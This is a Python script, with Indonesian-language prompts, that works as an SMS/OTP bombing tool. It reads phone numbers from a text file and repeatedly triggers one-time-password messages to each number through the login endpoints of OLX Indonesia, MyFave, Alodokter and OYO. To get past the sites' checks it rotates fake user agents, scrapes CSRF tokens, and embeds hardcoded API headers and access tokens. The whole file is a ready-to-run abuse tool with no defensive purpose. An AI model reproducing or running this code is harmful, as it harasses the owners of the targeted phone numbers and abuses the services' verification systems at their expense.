import requests
import json
import time
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as bs
ua = UserAgent()


class c:
    default = "\x1b[39m"
    bl = "\x1b[30m"
    r = "\x1b[31m"
    g = "\x1b[32m"
    y = "\x1b[33m"
    b = "\x1b[34m"
    p = "\x1b[35m"
    cy = "\x1b[36m"
    # Dark color
    dg = "\x1b[90m"
    # Light color
    lg = "\x1b[37m"
    lr = "\x1b[91m"
    lg = "\x1b[92m"
    ly = "\x1b[93m"
    lb = "\x1b[94m"
    lp = "\x1b[95m"
    lc = "\x1b[96m"
    # End color
    end = "\x1b[97m"


def panggil():
    strfile = input(c.lg+"Nama File: ")
    strfile = strfile + ".txt"
    return strfile


class spam:
    def olx(nom):
        for i in range(5):
            time.sleep(1)
            headers = {
                "accept": "*/*",
                "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
                "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
                "user-agent": ua.random,
                "content-type": "application/json",
            }
            data = json.dumps({"grantType": "retry",
                               "method": "sms",
                               "phone": "+62"+nom,
                               "language": "id"})
            requests.Session().post("https://www.olx.co.id/api/auth/authenticate",
                                    data=data, headers=headers).text

    def fav(nom):
        for i in range(5):
            time.sleep(1)
            hd = {
                "Host": "api.myfave.com",
                "Connection": "keep-alive",
                "x-user-agent": "Fave-PWA/v1.0.0",
                "User-Agent": ua.random,
                "content-type": "application/json",
                "Accept": "*/*",
                "Origin": "https://m.myfave.com",
                "Referer": "https://m.myfave.com/jakarta/auth",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
            }
            dat = {'phone': '62'+nom}
            requests.post("https://api.myfave.com/api/fave/v3/auth",
                          data=json.dumps(dat), headers=hd).text

    def alodokter(nom):
        for i in range(5):
            time.sleep(1)
            r = requests.Session()
            r.headers.update(
                {'referer': 'https://www.alodokter.com/login-alodokter'})
            hy = r.get("https://www.alodokter.com/login-alodokter")
            tol = bs(hy.text, 'html.parser')
            token = tol.find('meta', {'name': 'csrf-token'})['content']
            hd = {
                'user-agent': ua.random,
                'content-type': 'application/json',
                'referer': 'https://www.alodokter.com/login-alodokter',
                'accept': 'application/json',
                'origin': 'https://www.alodokter.com',
                'x-csrf-token': token
            }
            r.post("https://www.alodokter.com/login-with-phone-number",
                   headers=hd, json={"user": {"phone": "0"+nom}})

    def oyo(nom):
        for i in range(5):
            time.sleep(1)
            r = requests.Session()
            hd = {
                "Host": "identity-gateway.oyorooms.com",
                "consumer_host": "https://www.oyorooms.com",
                "accept-language": "id",
                "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
                "User-Agent": ua.random,
                "Content-Type": "application/json",
                "accept": "*/*",
                "origin": "https://www.oyorooms.com",
                "referer": "https://www.oyorooms.com/login",
                "Accept-Encoding": "gzip, deflate, br",
            }
            dat = json.dumps({"phone": nom, "country_code": "+62", "country_iso_code": "ID",
                              "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"})
            r.post(
                "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", headers=hd, data=dat)


def tmpl():
    try:
        file = panggil()
        num = 0
        ojk = open(file, "r")
        for num, line in enumerate(ojk, 1):
            num = [num]
        print(
            f"\n{c.lc}Jumlah yang ada di file {file} {c.lr}{str(num[0])}{c.lc} baris{c.lp} \n")
        sms(file)
    except AttributeError:
        print(f"\n{c.lc}AttributeError error")
    except ImportError:
        print(f"\n{c.lc}AttributeError error")
    except UnboundLocalError:
        print(f"\n{c.lc}UnboundLocalError error")
    except SystemError:
        print(f"\n{c.lc}SystemError error")


def sms(file):
    try:
        ojk = open(file, "r")
        on = 0
        for no in ojk:
            on += 1
            nom = no.replace('\n', '')
            if len(nom) <= 10:
                spam.fav(nom)
                spam.alodokter(nom)
                spam.oyo(nom)
                spam.olx(nom)
                print(f"{c.lb}0{nom} ~> Ini nomor yang ke {c.lr}{on}{c.lp}\n")
            elif len(nom) >= 10:
                spam.fav(nom)
                spam.alodokter(nom)
                spam.oyo(nom)
                spam.olx(nom)
                print(f"{c.lb}0{nom} ~> Ini nomor yang ke {c.lr}{on}{c.lp}\n")
        ojk.close()
    except AttributeError:
        print(f"\n{c.lc}AttributeError error")
    except ImportError:
        print(f"\n{c.lc}AttributeError error")
    except UnboundLocalError:
        print(f"\n{c.lc}UnboundLocalError error")
    except SystemError:
        print(f"\n{c.lc}SystemError error")
    except KeyboardInterrupt:
        print(f"\n{c.lc}Sukses ngab")


tmpl()
